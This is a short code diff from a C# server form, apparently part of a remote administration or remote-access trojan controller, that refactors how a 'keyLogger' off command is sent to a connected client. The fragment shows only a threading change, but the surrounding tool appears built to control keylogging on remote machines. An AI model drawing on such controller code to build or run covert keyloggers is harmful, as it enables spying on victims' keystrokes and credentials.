@@ -39,13 +39,13 @@ namespace Server.Forms
             Sb?.Clear();
             if (Client != null)
             {
-                new Thread(() =>
+                ThreadPool.QueueUserWorkItem((o) =>
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                     msgpack.ForcePathObject("isON").AsString = "false";
                     ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
-                }).Start();
+                });
             }
         }
 
